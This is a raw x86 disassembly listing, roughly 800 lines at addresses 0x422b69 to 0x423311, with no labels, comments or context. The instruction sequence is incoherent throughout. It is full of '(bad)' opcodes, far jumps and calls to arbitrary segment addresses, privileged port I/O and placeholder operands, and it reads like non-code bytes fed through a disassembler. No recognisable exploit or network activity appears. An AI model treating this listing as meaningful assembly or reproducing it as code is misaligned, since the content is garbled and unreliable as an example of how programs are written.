  422b69:	shl    BYTE PTR [ecx+0x342d3ba5],cl
  422b6f:	add    BYTE PTR [eax-0x6ec40ca2],dl
  422b75:	and    DWORD PTR [edi+0x60],edi
  422b78:	adc    eax,0x74c1bd15
  422b7d:	push   ecx
  422b7e:	add    BYTE PTR [ebx-0x53d00fa9],bh
  422b84:	push   ecx
  422b85:	add    eax,0x9bc40a9f
  422b8a:	push   cs
  422b8b:	cdq    
  422b8c:	(bad)  
  422b8d:	push   eax
  422b8e:	int3   
  422b8f:	cmp    ebx,DWORD PTR [edi+0x3032068d]
  422b95:	pop    ebp
  422b96:	inc    ecx
  422b97:	test   DWORD PTR [ebp-0x4c],ecx
  422b9a:	in     eax,0xa8
  422b9c:	les    esp,FWORD PTR [ecx]
  422b9e:	(bad)  
  422b9f:	(bad)  [ecx+0x3b]
  422ba2:	cs dec ebx
  422ba4:	or     esp,DWORD PTR es:[ebp-0x140e18c1]
  422bab:	std    
  422bac:	outs   dx,DWORD PTR ds:[esi]
  422bad:	cmp    ebp,DWORD PTR [eax+0x485386f]
  422bb3:	sub    al,0xc7
  422bb5:	je     0x422b7e
  422bb7:	sub    al,0x2c
  422bb9:	hlt    
  422bba:	inc    ebx
  422bbb:	or     al,0x2d
  422bbd:	iret   
  422bbe:	das    
  422bbf:	xchg   esi,eax
  422bc0:	test   al,0x45
  422bc2:	pop    ss
  422bc3:	dec    esp
  422bc4:	push   eax
  422bc5:	jmp    0xa715:0xb8281786
  422bcc:	mov    ecx,DWORD PTR [edx-0x53f7c2be]
  422bd2:	dec    ecx
  422bd3:	clc    
  422bd4:	aaa    
  422bd5:	fisubr DWORD PTR [ecx]
  422bd7:	or     eax,0xc2dfcb77
  422bdc:	inc    edx
  422bdd:	pop    esp
  422bde:	mov    esp,0x523a644c
  422be3:	push   cs
  422be4:	jge    0x422bee
  422be6:	cmp    al,0x2d
  422be8:	rol    cl,1
  422bea:	jecxz  0x422ba3
  422bec:	scas   eax,DWORD PTR es:[edi]
  422bed:	fs xchg ebp,eax
  422bef:	(bad)  [ebx+0x55]
  422bf2:	ja     0x422b7d
  422bf4:	xor    bl,BYTE PTR [edx+0x66]
  422bf7:	jmp    0x422bdf
  422bf9:	call   0x4f24:0xff534ce4
  422c00:	add    eax,0x4016d274
  422c05:	(bad)  
  422c06:	retf   
  422c07:	pop    ds
  422c08:	into   
  422c09:	out    dx,eax
  422c0a:	aam    0xf6
  422c0c:	inc    ebp
  422c0d:	ja     0x422b9d
  422c0f:	inc    edx
  422c10:	cmp    eax,ecx
  422c12:	sbb    eax,0xbebfd527
  422c17:	sbb    al,0x96
  422c19:	int    0x93
  422c1b:	dec    esi
  422c1c:	mov    dh,0xfe
  422c1e:	inc    edi
  422c1f:	enter  0x31a8,0xae
  422c23:	nop
  422c24:	cld    
  422c25:	mov    bh,BYTE PTR [ecx-0x76ce5f16]
  422c2b:	jo     0x422c3b
  422c2d:	call   0xab23:0x113d0ed
  422c34:	pop    ds
  422c35:	jge    0x422c1b
  422c37:	adc    DWORD PTR [ebp-0x3f],ebp
  422c3a:	loope  0x422c3e
  422c3c:	(bad)  
  422c3d:	fldpi  
  422c3f:	pop    esi
  422c40:	les    esi,FWORD PTR [edi]
  422c42:	xchg   BYTE PTR [esi+edi*2-0x69ba7857],ah
  422c49:	mov    ds:0xe56113b4,al
  422c4e:	mov    WORD PTR [eax+ecx*1-0x1b],gs
  422c52:	inc    DWORD PTR [esp+edx*8-0x46]
  422c56:	add    DWORD PTR [esi-0x7e03026c],esi
  422c5c:	ds inc ebx
  422c5e:	js     0x422c5b
  422c60:	jno    0x422c73
  422c62:	gs (bad) 
  422c64:	xor    dh,BYTE PTR [edi+eax*2+0x122dcfff]
  422c6b:	xchg   edx,eax
  422c6c:	repz mov al,ds:0x6f8c3e0e
  422c72:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c74:	add    esi,DWORD PTR [ecx+0x1d]
  422c77:	ins    BYTE PTR es:[edi],dx
  422c78:	test   BYTE PTR [ecx-0x19821946],bh
  422c7e:	pop    edx
  422c7f:	lods   al,BYTE PTR ds:[esi]
  422c80:	cmp    DWORD PTR [edi],edx
  422c82:	mov    ch,0x87
  422c84:	push   esp
  422c85:	stc    
  422c86:	xchg   BYTE PTR [ebp+0x5],bl
  422c89:	out    dx,al
  422c8a:	scas   al,BYTE PTR es:[edi]
  422c8b:	sub    eax,0x28ec99b4
  422c90:	push   ss
  422c91:	(bad)  
  422c92:	cli    
  422c93:	pop    es
  422c94:	std    
  422c95:	js     0x422cee
  422c97:	add    edx,DWORD PTR [eax-0x64]
  422c9a:	pop    eax
  422c9b:	inc    edi
  422c9c:	xchg   edi,eax
  422c9d:	jo     0x422cdc
  422c9f:	push   edx
  422ca0:	in     eax,0x42
  422ca2:	push   ebx
  422ca3:	adc    ecx,DWORD PTR [esi]
  422ca5:	add    bl,ch
  422ca7:	repz pop eax
  422ca9:	mov    esi,0x6c402886
  422cae:	lods   al,BYTE PTR ds:[esi]
  422caf:	icebp  
  422cb0:	(bad)  
  422cb1:	stc    
  422cb2:	bound  eax,QWORD PTR [ebp-0x701ab059]
  422cb8:	mov    bh,0x4e
  422cba:	push   esp
  422cbb:	je     0x422c5c
  422cbd:	in     al,0x3a
  422cbf:	jecxz  0x422c9a
  422cc1:	pop    esp
  422cc2:	and    eax,0x6dd74270
  422cc7:	call   0xfaaf9477
  422ccc:	iret   
  422ccd:	jb     0x422cda
  422ccf:	fs sub eax,0xb7b199ba
  422cd5:	aad    0x33
  422cd7:	shr    BYTE PTR [ebx+eax*1],cl
  422cda:	jl     0x422d25
  422cdc:	jne    0x422cec
  422cde:	shr    DWORD PTR [ecx-0x78],1
  422ce1:	xor    esp,ebp
  422ce3:	call   0x658f:0x1e1633f0
  422cea:	mov    dl,0xd5
  422cec:	outs   dx,BYTE PTR ds:[esi]
  422ced:	mov    bh,cl
  422cef:	lods   eax,DWORD PTR ds:[esi]
  422cf0:	stos   BYTE PTR es:[edi],al
  422cf1:	jae    0x422c9b
  422cf3:	cmp    bh,BYTE PTR [edi]
  422cf5:	in     al,dx
  422cf6:	cmp    dh,ch
  422cf8:	mov    ch,0xa0
  422cfa:	lods   al,BYTE PTR ds:[esi]
  422cfb:	push   ebx
  422cfc:	jmp    0x4d18:0x5f143b2f
  422d03:	fldcw  WORD PTR [eax]
  422d05:	adc    esi,DWORD PTR [edx+0x16]
  422d08:	jg     0x422cff
  422d0a:	xchg   esp,eax
  422d0b:	pusha  
  422d0c:	dec    edx
  422d0d:	dec    ebp
  422d0e:	jecxz  0x422d37
  422d10:	xchg   edx,eax
  422d11:	or     eax,0x6d4f6d2
  422d16:	add    ebx,edi
  422d18:	jo     0x422d97
  422d1a:	das    
  422d1b:	jbe    0x422cc1
  422d1d:	xchg   esi,eax
  422d1e:	sbb    BYTE PTR [ebx+0x33],ch
  422d21:	add    bl,BYTE PTR [ebx+0x7e514908]
  422d27:	popf   
  422d28:	ins    BYTE PTR es:[edi],dx
  422d29:	sbb    edi,DWORD PTR [ebp-0x23]
  422d2c:	add    al,0xa5
  422d2e:	jecxz  0x422d1c
  422d30:	inc    ebp
  422d31:	pop    ebp
  422d32:	xor    BYTE PTR [esi+0x162c0de1],ch
  422d38:	mov    WORD PTR [edi],ds
  422d3a:	sub    eax,0xb39d9171
  422d3f:	mov    edx,0x969f05be
  422d44:	push   ebp
  422d45:	mov    bh,0x30
  422d47:	jb     0x422dc4
  422d49:	pop    ebp
  422d4a:	push   ebp
  422d4b:	rcr    DWORD PTR [eax+0x46],1
  422d4e:	or     DWORD PTR [edi],esi
  422d50:	jmp    0xcb509e92
  422d55:	xchg   edx,eax
  422d56:	sub    BYTE PTR [edx+0x5d],0xdd
  422d5a:	cmp    ch,BYTE PTR [eax+0x56]
  422d5d:	mov    WORD PTR [ecx-0x7c],cs
  422d60:	mov    ecx,0xfbf99bf6
  422d65:	adc    BYTE PTR [edx+edi*8],0x52
  422d69:	cmp    dl,BYTE PTR [edi+ebp*1-0x14]
  422d6d:	or     dh,dl
  422d6f:	scas   al,BYTE PTR es:[edi]
  422d70:	pop    esi
  422d71:	ror    BYTE PTR [eax+0x4f4cbd1f],1
  422d77:	ds inc esi
  422d79:	(bad)  
  422d7a:	mov    ds:0xb0fd8814,al
  422d7f:	push   esp
  422d80:	sub    ecx,ebp
  422d82:	jle    0x422da2
  422d84:	(bad)  
  422d86:	loopne 0x422db3
  422d88:	push   esi
  422d89:	xlat   BYTE PTR ds:[ebx]
  422d8a:	(bad)  
  422d8b:	in     eax,0xa0
  422d8d:	jle    0x422dd1
  422d8f:	pop    ds
  422d90:	test   al,0xa3
  422d92:	out    dx,al
  422d93:	dec    edx
  422d94:	sub    al,0x43
  422d96:	mov    gs,esp
  422d98:	js     0x422d3d
  422d9a:	jle    0x422d53
  422d9c:	cwde   
  422d9d:	add    ah,BYTE PTR [edx]
  422d9f:	pop    eax
  422da0:	adc    BYTE PTR [ecx+0x20],bl
  422da3:	dec    ebp
  422da4:	jmp    0xf382:0xdb96fc69
  422dab:	jmp    0x95c58479
  422db0:	aad    0xac
  422db2:	loop   0x422dae
  422db4:	nop
  422db5:	icebp  
  422db6:	out    0xc7,al
  422db8:	out    dx,al
  422db9:	out    dx,eax
  422dba:	mov    edi,0xd78535f4
  422dbf:	sbb    DWORD PTR ds:0x3fbec876,0xffffffdb
  422dc7:	arpl   di,di
  422dc9:	out    0x1c,al
  422dcb:	popf   
  422dcc:	pop    ecx
  422dcd:	sub    ebp,DWORD PTR [bx+di-0xa48]
  422dd2:	inc    edi
  422dd3:	cmp    eax,0x8d7a685a
  422dd8:	jmp    0x422e0c
  422dda:	stc    
  422ddb:	retf   0x6678
  422dde:	mov    ebp,0xdbf7900e
  422de3:	arpl   dx,cx
  422de5:	repnz xor ebp,DWORD PTR [ebp-0x62ad7671]
  422dec:	inc    edx
  422ded:	jns    0x422e66
  422def:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422df0:	mov    ds:0x9c6dad3c,al
  422df5:	jecxz  0x422da3
  422df7:	shr    DWORD PTR [edi+0x18c45791],cl
  422dfd:	pop    ebx
  422dfe:	daa    
  422dff:	sub    esi,esi
  422e01:	rcr    BYTE PTR [ebp-0x65],cl
  422e04:	pop    ebx
  422e05:	outs   dx,DWORD PTR ds:[esi]
  422e06:	xchg   esp,eax
  422e07:	pop    ebp
  422e08:	xchg   BYTE PTR [edi-0x22fa3bd2],bl
  422e0e:	sub    al,0xb8
  422e10:	or     DWORD PTR [edi+0x68c73829],ebp
  422e16:	fnsave [esi+0x29]
  422e19:	sub    eax,0x478cf912
  422e1e:	ins    DWORD PTR es:[edi],dx
  422e1f:	sbb    esp,DWORD PTR [esi-0x6a]
  422e22:	jmp    0x6f034d34
  422e27:	in     eax,dx
  422e28:	add    ebx,DWORD PTR [eax-0x1be7365]
  422e2e:	jge    0x422dde
  422e30:	out    0x13,eax
  422e32:	cmp    BYTE PTR [eax],dh
  422e34:	daa    
  422e35:	std    
  422e36:	mov    esp,0x1d3438ce
  422e3b:	jge    0x422e13
  422e3d:	mov    ebx,0x13817a5b
  422e42:	xor    al,0xae
  422e44:	xchg   esi,eax
  422e45:	mov    ebp,0x90ae6205
  422e4a:	addr16 push edi
  422e4c:	sar    DWORD PTR [eax],cl
  422e4e:	push   0x19
  422e50:	cs (bad) 
  422e52:	jg     0x422e7f
  422e54:	retf   0x60ea
  422e57:	jnp    0x422eba
  422e59:	add    BYTE PTR [ecx],dh
  422e5b:	sub    DWORD PTR [edi+ebp*8+0x6c],esi
  422e5f:	inc    edx
  422e60:	cmp    al,BYTE PTR [edx]
  422e62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e63:	inc    esi
  422e64:	pop    edx
  422e65:	and    cl,cl
  422e67:	inc    edi
  422e68:	jge    0x422e86
  422e6a:	(bad)  
  422e6b:	lods   al,BYTE PTR ds:[esi]
  422e6d:	int    0x33
  422e6f:	jb     0x422e04
  422e71:	in     eax,dx
  422e72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e73:	lds    ebx,FWORD PTR [ebx-0x7a6b97c3]
  422e79:	jne    0x422e3a
  422e7b:	jle    0x422ebd
  422e7d:	cmp    BYTE PTR [ebp-0x381b2793],bh
  422e83:	mov    edi,0xf1374534
  422e88:	test   ebx,edi
  422e8a:	repnz int 0xc5
  422e8d:	ror    BYTE PTR [ecx-0x1b],1
  422e90:	ret    0x943e
  422e93:	jmp    ebp
  422e95:	popa   
  422e96:	or     eax,0xbeeaaafd
  422e9b:	arpl   WORD PTR [eax],sp
  422e9d:	imul   esp,DWORD PTR [ecx-0xde39b15],0x9fe343a
  422ea7:	repz dec ecx
  422ea9:	adc    DWORD PTR [ebx+0x7b],0xa80d6c4a
  422eb0:	mov    ds:0x6b17661e,eax
  422eb5:	scas   eax,DWORD PTR es:[edi]
  422eb6:	jecxz  0x422f04
  422eb8:	dec    edi
  422eb9:	rcr    edx,1
  422ebb:	test   BYTE PTR [ecx+0x5499c085],cl
  422ec1:	rol    ch,1
  422ec3:	xor    al,0x29
  422ec5:	std    
  422ec6:	xchg   DWORD PTR [esp+ebx*1-0x76],esi
  422eca:	(bad)  
  422ecb:	or     al,0xf4
  422ecd:	ret    
  422ece:	inc    edi
  422ecf:	xor    eax,0xf17c6c6b
  422ed4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ed5:	(bad)  [ebx-0x5ab894c8]
  422edb:	psllw  mm6,QWORD PTR [edi]
  422ede:	sar    BYTE PTR [ebp+0x43],0x82
  422ee2:	jns    0x422f31
  422ee4:	or     BYTE PTR [ebp-0x3e],al
  422ee7:	ror    ebx,cl
  422ee9:	data16 ficom DWORD PTR [edx]
  422eec:	int    0x23
  422eee:	mov    fs,WORD PTR [esi+ebp*1+0x51]
  422ef2:	dec    eax
  422ef3:	dec    ebx
  422ef4:	test   al,0xe3
  422ef6:	mov    ebp,0xd538bb2d
  422efb:	mov    WORD PTR [ebx],?
  422efd:	mov    dl,0x71
  422eff:	add    ebx,DWORD PTR [esp+edi*8-0x4d7990f]
  422f06:	icebp  
  422f07:	das    
  422f08:	push   ebp
  422f09:	ret    0xb3c6
  422f0c:	mov    ?,ebx
  422f0e:	adc    edx,esi
  422f10:	push   cs
  422f11:	mov    esi,0xc3925a3f
  422f16:	sbb    eax,0x1b67f6b4
  422f1b:	ret    0xdb65
  422f1e:	dec    edx
  422f1f:	shl    esp,cl
  422f21:	aad    0xdc
  422f23:	xchg   esp,eax
  422f24:	imul   DWORD PTR [edx]
  422f26:	(bad)  
  422f27:	iret   
  422f28:	sbb    BYTE PTR [ebp+0x2bc0e5ef],bl
  422f2e:	xchg   edx,eax
  422f2f:	fbstp  TBYTE PTR [edi]
  422f31:	push   ebp
  422f32:	adc    bh,BYTE PTR [esp+ebp*8+0x694f51c8]
  422f39:	lea    edx,[esi]
  422f3b:	daa    
  422f3c:	fdiv   DWORD PTR [ebx]
  422f3e:	into   
  422f3f:	cmp    al,0xaa
  422f41:	in     al,dx
  422f42:	out    dx,al
  422f43:	adc    BYTE PTR [edx+0x562199],ah
  422f49:	in     al,0xe4
  422f4b:	and    DWORD PTR [ebx],ecx
  422f4d:	xchg   ebp,eax
  422f4e:	mov    edx,0x3ce4e3e6
  422f53:	or     ah,BYTE PTR [edx-0xd]
  422f56:	jmp    0xf75a:0x76656868
  422f5d:	popf   
  422f5e:	dec    ebp
  422f5f:	aam    0xa1
  422f61:	jl     0x422f6b
  422f63:	xchg   edi,eax
  422f64:	or     esi,eax
  422f66:	lock cs or eax,0x8a85adf4
  422f6d:	or     edi,edi
  422f6f:	mov    ah,0x44
  422f71:	loop   0x422f67
  422f73:	add    DWORD PTR [ebx+0x2d],edi
  422f76:	jecxz  0x422fb7
  422f78:	scas   al,BYTE PTR es:[edi]
  422f79:	cli    
  422f7a:	mov    al,0x42
  422f7c:	jmp    0x2367:0x1cd57509
  422f83:	pop    esi
  422f84:	cmp    eax,0xab482d6
  422f89:	fbld   TBYTE PTR [edx]
  422f8b:	(bad)  
  422f8c:	jno    0x422fa4
  422f8e:	xor    al,0x6
  422f90:	ins    DWORD PTR es:[edi],dx
  422f91:	pop    eax
  422f92:	out    dx,al
  422f93:	add    al,0xcd
  422f95:	movs   WORD PTR es:[edi],WORD PTR gs:[esi]
  422f98:	xchg   ecx,eax
  422f99:	pop    es
  422f9a:	(bad)  
  422f9c:	lods   al,BYTE PTR ds:[esi]
  422f9d:	ficom  DWORD PTR [esi]
  422f9f:	aam    0xe3
  422fa1:	imul   ecx,DWORD PTR [esi+ecx*4+0x4c2ede87],0x4f
  422fa9:	ret    0x391c
  422fac:	dec    esi
  422fad:	mov    ebp,0xe939c79b
  422fb2:	imul   esi,DWORD PTR [ebp+0x60],0x2b
  422fb6:	pusha  
  422fb7:	mov    esp,0xdb1bd10f
  422fbc:	xchg   ecx,eax
  422fbd:	mov    edi,0xbd98208d
  422fc2:	push   edi
  422fc3:	xchg   ecx,eax
  422fc4:	lds    ecx,FWORD PTR [esi+0x42]
  422fc7:	lahf   
  422fc8:	push   cs
  422fc9:	fwait
  422fca:	mov    dh,0x43
  422fcc:	push   cs
  422fcd:	aam    0xcb
  422fcf:	xor    al,0xd6
  422fd1:	ja     0x422ff6
  422fd3:	or     DWORD PTR [eax+0x34],ecx
  422fd6:	add    DWORD PTR gs:[edx-0x3c9d95c0],0x69a458b8
  422fe1:	pop    ds
  422fe2:	pop    esi
  422fe3:	rol    BYTE PTR [esi+0x433cadc1],0xb0
  422fea:	adc    eax,0x38830486
  422fef:	dec    ebp
  422ff0:	mov    dl,0x36
  422ff2:	push   edi
  422ff3:	js     0x422f9e
  422ff5:	mov    al,ds:0xa85e012
  422ffa:	pop    ss
  422ffb:	rol    BYTE PTR [ebp+0x22125997],1
  423001:	push   esp
  423002:	int3   
  423003:	imul   ebp,DWORD PTR [edi-0xe],0x80f80d7
  42300a:	xchg   edx,eax
  42300b:	shl    DWORD PTR [edi+0x7a],0xf
  42300f:	fscale 
  423011:	pop    eax
  423012:	pop    es
  423013:	je     0x422fd7
  423015:	ins    BYTE PTR es:[edi],dx
  423016:	retf   0xd59e
  423019:	pop    ss
  42301a:	xchg   ebp,eax
  42301b:	fld    QWORD PTR [edi-0x2f]
  42301e:	sahf   
  42301f:	xor    edx,ecx
  423021:	test   al,0xee
  423023:	out    0x6d,eax
  423025:	mov    BYTE PTR [ebx+0x3b],bh
  423028:	ins    BYTE PTR es:[edi],dx
  423029:	sub    ebp,DWORD PTR [esi-0x29]
  42302c:	xor    DWORD PTR [edi+0x715a17bf],edi
  423032:	adc    al,0x53
  423034:	repz cmp ebx,DWORD PTR [ebx+esi*1]
  423038:	fcom   st(4)
  42303a:	sbb    BYTE PTR [eax+0x56],0xa1
  42303e:	into   
  42303f:	cdq    
  423040:	push   eax
  423041:	mov    WORD PTR [edi+0x33],fs
  423044:	jmp    0x5c12:0x7cc4bf4c
  42304b:	arpl   sp,bp
  42304d:	xor    al,0x9c
  42304f:	and    ch,BYTE PTR [eax-0x2af62b47]
  423055:	and    eax,0x7a35a136
  42305a:	add    al,BYTE PTR [ebx]
  42305c:	pop    ecx
  42305d:	rcr    BYTE PTR [ebx+0x74],cl
  423060:	cdq    
  423061:	push   esp
  423062:	jge    0x423037
  423064:	jno    0x42304a
  423066:	fild   DWORD PTR [eax-0x68]
  423069:	popa   
  42306a:	pop    ds
  42306b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42306c:	xchg   ecx,eax
  42306d:	fldcw  WORD PTR [edx]
  42306f:	retf   
  423070:	sub    ch,BYTE PTR [eax]
  423072:	mov    ebx,0xd2994cfe
  423077:	or     dh,BYTE PTR [eax-0x5088c8fa]
  42307d:	out    dx,eax
  42307e:	push   ds
  42307f:	xchg   ecx,eax
  423080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423081:	jle    0x4230c7
  423083:	xchg   ebx,eax
  423084:	sbb    DWORD PTR [esi+0x35980546],edi
  42308a:	xor    eax,esi
  42308c:	stos   DWORD PTR es:[edi],eax
  42308d:	pop    ebx
  42308e:	sbb    dl,bl
  423090:	inc    esi
  423091:	adc    eax,0x824829be
  423096:	sub    BYTE PTR ds:0x870a94be,ah
  42309c:	sbb    DWORD PTR cs:[ebp+0x29],esp
  4230a0:	sub    BYTE PTR [esi+0x1f],bl
  4230a3:	gs sub eax,0xeb22d0f6
  4230a9:	(bad)  
  4230aa:	sub    ch,cl
  4230ac:	mov    DWORD PTR [edi+0x2571ead5],edi
  4230b2:	leave  
  4230b3:	cmp    BYTE PTR [edx],al
  4230b5:	shl    BYTE PTR [edx+esi*2],0xe8
  4230b9:	dec    eax
  4230ba:	fs rcl DWORD PTR gs:[esi],1
  4230be:	jl     0x4230a4
  4230c0:	adc    BYTE PTR [edi],dh
  4230c2:	dec    BYTE PTR [esi-0x1396fcd4]
  4230c8:	cs sbb al,0xa2
  4230cb:	sbb    ecx,DWORD PTR [eax+0x571b357f]
  4230d1:	stc    
  4230d2:	stos   BYTE PTR es:[edi],al
  4230d3:	out    0x82,eax
  4230d5:	jg     0x423121
  4230d7:	pop    ebp
  4230d8:	sbb    ecx,DWORD PTR [edx]
  4230da:	outs   dx,DWORD PTR ds:[esi]
  4230db:	add    al,0xe1
  4230dd:	xor    al,bh
  4230df:	push   ss
  4230e0:	jbe    0x423062
  4230e2:	int3   
  4230e3:	xchg   DWORD PTR [ecx+0x14],ebx
  4230e6:	in     eax,dx
  4230e7:	cwde   
  4230e8:	daa    
  4230e9:	adc    DWORD PTR [ecx],edi
  4230eb:	inc    ecx
  4230ec:	xchg   ebp,eax
  4230ed:	jo     0x4230cf
  4230ef:	rcr    BYTE PTR [ebx-0x2a],cl
  4230f2:	dec    ebx
  4230f3:	push   eax
  4230f5:	in     al,dx
  4230f6:	push   es
  4230f7:	test   al,0xe0
  4230f9:	call   0x20b24824
  4230fe:	test   DWORD PTR [edx],eax
  423100:	xlat   BYTE PTR ds:[ebx]
  423101:	icebp  
  423102:	cmp    eax,0xde40c275
  423107:	lahf   
  423108:	xor    edx,DWORD PTR [edi+0x10dffb2f]
  42310e:	mov    ah,0xc3
  423110:	add    al,BYTE PTR [edi-0xf]
  423113:	es pop ebp
  423115:	repz mov ch,0xc7
  423118:	adc    DWORD PTR [ebx-0x74b5de84],edi
  42311e:	mov    eax,ds:0x81eda7
  423123:	mov    cl,0xd6
  423125:	inc    ecx
  423126:	mov    eax,0x9ab0e6ab
  42312b:	cld    
  42312c:	mov    edx,0x360c5222
  423131:	add    al,0xe3
  423133:	push   edx
  423134:	fs sahf 
  423136:	repz jne 0x4230e8
  423139:	call   0x80df74b5
  42313e:	nop
  42313f:	jne    0x423146
  423141:	pop    esp
  423142:	(bad)  
  423143:	xchg   ebp,eax
  423144:	dec    esi
  423145:	das    
  423146:	sbb    esp,DWORD PTR [esi]
  423148:	test   al,0xf
  42314a:	pop    ecx
  42314b:	aad    0xf3
  42314d:	fdivr  DWORD PTR [eax-0x74]
  423150:	cld    
  423151:	lds    ebp,FWORD PTR [edi+0x77]
  423154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423155:	push   edx
  423156:	and    ch,BYTE PTR [ecx+ecx*2]
  423159:	imul   edx,DWORD PTR [edx+0x7f],0xd2b52926
  423160:	xor    esp,eax
  423162:	xchg   ebp,eax
  423163:	lock push esp
  423165:	xchg   esp,eax
  423166:	mov    ds:0x9b1e027a,al
  42316b:	sub    DWORD PTR [edx],ebx
  42316d:	retf   0xb2b
  423170:	adc    cl,ah
  423172:	dec    ebp
  423173:	mov    ebp,0xb90aca09
  423178:	xlat   BYTE PTR ds:[ebx]
  423179:	jno    0x42312e
  42317b:	mov    al,0x13
  42317d:	rcr    DWORD PTR [ebp-0x34eecffd],0xa
  423184:	xor    ebp,DWORD PTR [ecx]
  423186:	xor    al,0x39
  423188:	cwde   
  423189:	std    
  42318a:	jmp    0x95b8:0xf7b505b4
  423191:	rcr    BYTE PTR [edx],cl
  423193:	out    0x90,al
  423195:	fiadd  WORD PTR [eax-0xa0b9ffe]
  42319b:	or     al,0xa9
  42319d:	pop    es
  42319e:	xchg   edi,eax
  42319f:	stc    
  4231a0:	xchg   esp,eax
  4231a1:	and    al,0x98
  4231a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231a4:	push   esp
  4231a5:	adc    al,0x16
  4231a7:	mov    ah,0x57
  4231a9:	dec    ebp
  4231aa:	rol    BYTE PTR [esi+ebp*8+0x31a848b5],0x27
  4231b2:	adc    ebx,edi
  4231b4:	push   ebp
  4231b5:	dec    ebx
  4231b6:	mov    eax,ds:0xb0b072f5
  4231bb:	push   edi
  4231bc:	push   0x4364a870
  4231c1:	mov    ecx,0xb927141
  4231c6:	adc    DWORD PTR [esi-0x43],ebx
  4231c9:	and    esp,ebp
  4231cb:	jo     0x19bcbb26
  4231d1:	xchg   edx,eax
  4231d2:	xchg   ecx,eax
  4231d3:	les    edx,FWORD PTR [esi+0x29]
  4231d6:	icebp  
  4231d7:	mov    dh,0x69
  4231d9:	loope  0x423221
  4231db:	jmp    0x60ef:0xb434534d
  4231e2:	into   
  4231e3:	and    DWORD PTR [esi+0x59],ebx
  4231e6:	retf   0x77c8
  4231e9:	daa    
  4231ea:	adc    edx,DWORD PTR [ecx+ecx*1]
  4231ed:	(bad)  
  4231ee:	push   ebx
  4231ef:	pop    ecx
  4231f0:	mov    cl,0x7d
  4231f2:	mov    dh,BYTE PTR es:[edx-0x157ffd58]
  4231f9:	aas    
  4231fa:	clc    
  4231fb:	cdq    
  4231fc:	mov    ecx,0x9a1b0f40
  423201:	add    eax,0xfcd635f5
  423206:	or     ah,BYTE PTR [ecx]
  423208:	retf   
  423209:	sbb    al,0x6f
  42320b:	cmp    ah,BYTE PTR [edx]
  42320d:	dec    ecx
  42320e:	xchg   ebx,eax
  42320f:	(bad)  
  423211:	lds    ecx,FWORD PTR [ebx-0x599e3c1f]
  423217:	(bad)  
  423218:	and    DWORD PTR [esi-0x61431c6d],ecx
  42321e:	inc    ebx
  42321f:	ins    DWORD PTR es:[edi],dx
  423220:	mov    dl,0x50
  423222:	sbb    dh,BYTE PTR [edi+0x2d285b14]
  423228:	rcr    edx,1
  42322a:	sbb    BYTE PTR [esi-0x46],dh
  42322d:	mov    eax,ds:0xff70bf6d
  423232:	adc    edi,DWORD PTR [ecx+0x28]
  423235:	popa   
  423236:	sub    bh,BYTE PTR [ebp-0x4e]
  423239:	mov    ecx,0x226ac81f
  42323e:	rcr    esp,0x95
  423241:	mov    al,ds:0xa313d4db
  423246:	stos   DWORD PTR es:[edi],eax
  423247:	div    BYTE PTR [ebx]
  423249:	sbb    BYTE PTR [eax+0x354c5889],0x2e
  423250:	leave  
  423251:	clc    
  423252:	outs   dx,BYTE PTR ds:[esi]
  423253:	inc    esp
  423254:	sub    al,0x3b
  423256:	sub    eax,0x78495714
  42325b:	dec    edi
  42325c:	pop    edx
  42325d:	mov    eax,ds:0xe8342aee
  423262:	or     dh,ah
  423264:	or     esp,esi
  423266:	add    al,0xd1
  423268:	out    dx,eax
  423269:	je     0x42327c
  42326b:	sub    al,0xb
  42326d:	arpl   WORD PTR [edi+0x10c200b4],sp
  423273:	pop    edi
  423274:	cmp    cl,bh
  423276:	jp     0x423238
  423278:	cdq    
  423279:	cmp    bl,ch
  42327b:	inc    eax
  42327c:	xchg   ebp,eax
  42327d:	push   ebp
  42327e:	pop    esi
  42327f:	stos   BYTE PTR es:[edi],al
  423280:	dec    edi
  423281:	mov    ecx,0xd62cd1f0
  423286:	adc    DWORD PTR ds:0x1589be01,ecx
  42328c:	test   eax,0x2253089f
  423291:	adc    DWORD PTR [eax+0x5ac78a12],ecx
  423297:	pusha  
  423298:	push   eax
  423299:	mov    ds:0x73afc026,al
  42329e:	hlt    
  42329f:	fwait
  4232a0:	les    edx,FWORD PTR [edi-0x36adca9a]
  4232a6:	out    0x86,al
  4232a8:	xor    cl,BYTE PTR [esi]
  4232aa:	in     eax,0xf3
  4232ac:	mov    al,ds:0xba383642
  4232b1:	mov    ds:0xb2dcbcb9,al
  4232b6:	popf   
  4232b7:	js     0x423272
  4232b9:	xor    BYTE PTR [ebp+ebx*1-0x46b70ec8],ah
  4232c0:	nop
  4232c1:	retf   0x3f62
  4232c4:	jo     0x4232d7
  4232c6:	push   edi
  4232c7:	inc    eax
  4232c8:	push   ss
  4232c9:	cmp    al,0x8f
  4232cb:	mov    dl,0xed
  4232cd:	mov    ah,0x37
  4232cf:	imul   DWORD PTR [ebx]
  4232d1:	loope  0x423267
  4232d3:	div    DWORD PTR [eax]
  4232d5:	fwait
  4232d6:	sub    esi,ecx
  4232d8:	jbe    0x4232cd
  4232da:	scas   eax,DWORD PTR es:[edi]
  4232db:	or     al,0x35
  4232dd:	fcmovbe st,st(6)
  4232df:	not    DWORD PTR [edx]
  4232e1:	dec    ebx
  4232e2:	imul   ebp,DWORD PTR [ebx+0x1f],0xb776ece5
  4232e9:	shl    ebx,1
  4232eb:	jb     0x423338
  4232ed:	add    BYTE PTR [eax+0xf],al
  4232f0:	dec    esi
  4232f1:	push   ebx
  4232f2:	cmp    ch,BYTE PTR [eax+0x72]
  4232f5:	int    0x5d
  4232f7:	std    
  4232f8:	sbb    ebp,DWORD PTR [esi+0x137de912]
  4232fe:	fist   WORD PTR [ebx+ebx*2-0x5ed328d0]
  423305:	mov    ecx,DWORD PTR [esi]
  423307:	pop    edi
  423308:	adc    al,0xb4
  42330a:	sbb    ch,bh
  42330c:	aas    
  42330d:	imul   ebp,DWORD PTR [esi+eiz*1],0xffffffd0
  423311:	mov    ah,0x6c
